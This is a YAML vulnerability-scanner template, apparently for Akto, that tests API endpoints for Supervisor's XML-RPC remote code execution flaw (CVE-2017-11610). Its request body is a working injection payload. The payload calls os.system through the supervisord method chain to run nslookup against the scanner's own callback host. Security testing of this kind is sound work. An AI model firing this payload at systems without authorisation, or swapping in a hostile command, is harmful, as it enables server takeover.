@@ -1,0 +1,68 @@
+id: XML_RPC_RCE
+info:
+  name: "XML-RPC Server Remote Code Execution"
+  description: "XML-RPC Server Remote Code Execution (RCE) vulnerabilities occur when an XML-RPC service fails to properly validate or sanitize input, allowing attackers to execute arbitrary code on the server. This can happen through malicious XML payloads that exploit weaknesses in the server's handling of requests. By leveraging such vulnerabilities, attackers can gain unauthorized access, manipulate data, or take control of the affected system. Implementing strict input validation and regularly updating software are essential to mitigate RCE risks in XML-RPC services."
+  details: "XML-RPC Server Remote Code Execution (RCE) vulnerabilities arise when the server does not adequately sanitize or validate XML payloads received from clients. Attackers can craft malicious XML requests that exploit flaws in the server's parsing or execution logic, potentially leading to the execution of arbitrary code. This can compromise the server's security, allowing unauthorized access to sensitive data or manipulation of the system. To mitigate these risks, it is crucial to implement robust input validation, sanitize all incoming requests, and keep the XML-RPC server software updated with the latest security patches."
+  impact: "The impact of XML-RPC Server Remote Code Execution (RCE) vulnerabilities can be significant, enabling attackers to execute arbitrary code on the server and potentially gain full control over it. This may lead to unauthorized access to sensitive data, modification or destruction of resources, and the ability to deploy malware or conduct further attacks. Additionally, such exploits can undermine the trust of users and stakeholders, resulting in reputational damage, financial losses, and potential legal ramifications for affected organizations."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: XML_RPC_RCE
+  severity: CRITICAL
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  cwe:
+    - CWE-78
+  cve:
+    - CVE-2017-11610
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  response_payload:
+    length:
+      gt: 0
+  method:
+    neq: "OPTIONS"
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_method: POST
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - replace_body: '        <methodCall> <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName> <params> <param> <string>nslookup https://test-services.akto.io/${random_uuid}</string> </param> </params> </methodCall>'
+        - modify_url: "/RPC2"
+        - modify_header:
+            content-type: "text/xml"
+        - add_header:
+            accept: "text/xml"
+
+validate:
+  response_code:
+    eq: 200
+  ssrf_url_hit: ${random_uuid}
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "<methodResponse>"
+      - "<int>"
+    not_contains:
+      - </html>
+      - <html>
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "text/xml"
+strategy:
+  run_once: /
